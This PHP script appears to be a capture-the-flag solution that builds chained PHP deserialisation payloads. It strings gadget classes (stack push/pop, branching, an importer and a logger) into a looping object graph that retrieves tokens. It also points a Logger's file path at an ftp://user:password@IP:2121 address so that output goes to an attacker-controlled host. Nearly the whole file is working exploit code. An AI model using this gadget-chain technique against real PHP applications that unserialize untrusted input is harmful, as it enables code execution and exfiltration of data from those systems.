<?php 

include_once("class.php");

// Always start with something that can run without error (Maze)
$payload = makeMazeSerial();

// We first need to initialize the stack by pushing two zeros to the stack
// The first will be repeatedly used in goal_reached via GlobalStack::peek()
// The second will be actual value of $tokenExpected, which starts as 0
// We can get 0 by calling the done function in the thirdToken

$payload = makeImporterSerial($payload, new thirdToken, "done");
$payload = makeImporterSerial($payload, new GlobalStack, "push");  // Note that push returns the pushed value
$payload = makeImporterSerial($payload, new GlobalStack, "push");

// Next, add the call to the branching section, which we will pass in the POST var called "#f3f3cfff"
//   We use this string as we can retrieve it from the Defaults class
$payload = makeImporterSerial($payload, new Defaults, "ok");
// The branch payload is then called via import
$payload = makeImporterSerial($payload, new Post, "import");

// Once the branching is finished, we need to retrieve and output the final token just like we did with Token 1
$payload = makeImporterSerial($payload, new thirdToken, "done");

// Call the logger, but with file set to ftp://IP
$ip = current(preg_grep('/^10\./', explode(' ', trim(shell_exec('hostname -I')))));

$URI = "ftp://user:password@$ip:2121";

$logger = new Logger();
$logger->logFile = $URI;

$payload = makeImporterSerial($payload, $logger, "log");

// Now output the first payload to use
echo "import:     $payload\n\n\n";
file_put_contents("import.txt", $payload);

// Now we create the branching payload
// Start by calling done to check if we are finished (note we pass Maze as a safe payload to start!)
// Note we need to first push (and later pop) a 0 for the branch to peek at!
// However, done no longer reliably returns a 0 since we are in the running loop!
// We can instead get a falsy value (which will work with 0) by running isEmpty from the stack. 
$check_done_payload = makeImporterSerial(makeMazeSerial(), new GlobalStack, "isEmpty");
$check_done_payload = makeImporterSerial($check_done_payload, new GlobalStack, "push");
$check_done_payload = makeImporterSerial($check_done_payload, new thirdToken, "done");

// Due to the way @serialize works, we need to create the branches before we call the branching function

// For the failure branch, we just need to exit, so pass a safe payload and callback
$failure_done_payload = makeImporterSerial(makeMazeSerial(), new Defaults, "ok");

// Now, the success branch (note we pass Maze as a safe payload to start!)
// Success here means done() returned 0, so we need call either call0 or call1
// This means we need another branch! Currently the stack is:
// 0    <---- used to compare with done
// 0/1  <---- the value of $tokenExpected
// 0    <---- the initial 0 we pushed on the stack
// So, we need to pop off the 0, then pop off $tokenExpected to pass to the branch
$success_done_payload = makeImporterSerial(makeMazeSerial(), new GlobalStack, "pop");
$success_done_payload = makeImporterSerial($success_done_payload, new GlobalStack, "pop");

// Due to the way @serialize works, we need to create the branches before we call the branching function

// The failure/success branch are the same, except they call different functions
// Success means $tokenExpected == 0, so call0 in that case. Failure is call1.
$call0_payload = makeImporterSerial(makeMazeSerial(), new thirdToken, "call0");
$call1_payload = makeImporterSerial(makeMazeSerial(), new thirdToken, "call1");

// Push the returned value to the stack for the next run
$call0_payload = makeImporterSerial($call0_payload, new GlobalStack, "push");
$call1_payload = makeImporterSerial($call1_payload, new GlobalStack, "push");

//Call the import function just like before to restart the loop
$call0_payload = makeImporterSerial($call0_payload, new Defaults, "ok");
$call0_payload = makeImporterSerial($call0_payload, new Post, "import");
$call1_payload = makeImporterSerial($call1_payload, new Defaults, "ok");
$call1_payload = makeImporterSerial($call1_payload, new Post, "import");

// Now we need to link up the success/failure branches with the branch! First, the call0/call1 branch

// The branch continues off $success_done_payload, then branches to call0 or call1 
$success_done_payload = makeBranchSerial($success_done_payload, $call0_payload, $call1_payload);

// The first "done" branch continues off $check_done_payload
$check_done_payload = makeBranchSerial($check_done_payload, $success_done_payload, $failure_done_payload);

// $check_done_payload now contains the full branching payload for import!
// Output it

echo "#f3f3cfff:     $payload\n\n\n";
file_put_contents("#f3f3cfff.txt", $check_done_payload);